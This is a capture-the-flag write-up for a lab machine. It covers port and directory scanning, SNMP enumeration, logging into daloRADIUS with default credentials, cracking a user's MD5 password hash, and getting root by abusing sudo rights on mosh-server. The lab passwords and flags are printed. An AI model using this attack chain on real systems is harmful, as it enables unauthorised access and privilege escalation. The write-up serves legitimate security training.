Let's scan the IP address
```bash
sudo nmap -v -sV -sC 10.10.11.48
```

![image](images/20250313203429.png)

When going to the site we see a simple Apache page

![image](images/20250313205738.png)

Scanning subdomains via `wfuzz` did not bring any results
```bash
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.10.10.11.48" http://10.10.11.48/
```
When scanning directories via `gobuster` the following directory was found `/server-status` with status `403 Forbidden`,
```bash
gobuster dir -u http://10.10.11.48/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![image](images/20250313211821.png)

Let's try to scan UDP ports
```bash
sudo nmap -sU 10.10.11.48
```

![image](images/20250313221531.png)

More open ports were found, including `SNMP`. Get hierarchical `SNMP` data from devices with `snmpwalk`
```bash
snmpwalk -v 2c -c public 10.10.11.48
```
, where:
- `-v 2c` - Specifies `SNMP` version `2c` (older, but common).
- `-c public` - Community string that functions as a password, in this case the default is `public`.

![image](images/20250313223944.png)


>[!info] Note
>The Simple Network Management Protocol (SNMP) is widely used to manage and monitor network devices such as routers, servers, and switches. The `snmpwalk` command queries `SNMP`-enabled devices, obtaining a variety of information.

We see that `daloradius` is mentioned. Let's try to navigate this directory

![image](images/20250313224545.png)

There may be other directories inside it. Let's try
```bash
ffuf -u http://10.10.11.48/daloradius/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

![image](images/20250313224646.png)

`app` was found. Let's switch to it and go through it further

![image](images/20250313225022.png)

```bash
ffuf -u http://10.10.11.48/daloradius/app/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

![image](images/20250313224759.png)

There are 3 directories: `common`, `users`, `operators`. Let's go to the page of each of them

![image](images/20250313224939.png)


![image](images/20250313224951.png)


![image](images/20250313225002.png)

As if the login form for `operators` is more interesting. After googling, I found the default login data for `daloRADIUS` - it's `administrator/radius`

![image](images/20250313225154.png)


![image](images/20250313225228.png)


![image](images/20250313225247.png)

In `Users` there is a user `svcMosh`, which has a password hash
```hash
412DD4759978ACFCC81DEAB01B382403
```

![image](images/20250313225516.png)

Let's crack this `MD5` hash
```bash
hashcat -m 0 svcMosh /usr/share/wordlists/rockyou.txt
```

![image](images/20250313225842.png)

Result:
```Password
underwaterfriends
```
Let's connect via `SSH`

![image](images/20250313225944.png)

<div style="page-break-after: always;"></div>

First flag
```flag
c1dbdbe705e681d3377cbb995e81de84
```
Let's check what `sudo` commands this user can run. We see that he can run `/usr/bin/mosh-server`. When this script is executed, the port `60002` and the session key `CQ/tXB74ShVVulAXAYY7MQ` are given. The server is waiting for a client to connect on this port with the specified key. To connect to `Mosh`, enter the command
```bash
MOSH_KEY=1C/28rYqT1xXjC4lqpRmQA mosh-client 127.0.0.1 60001
```

![image](images/20250313230641.png)

After sending the session key, we get the `root` terminal

![image](images/20250313230620.png)

Second flag
```flag
7a5817bb9452b7263d6a0a11353917fb
```

>**Mosh (Mobile Shell)** is a remote terminal application that uses UDP to provide reliable connections even over changing networks. This feature is especially useful for maintaining persistent shell sessions.
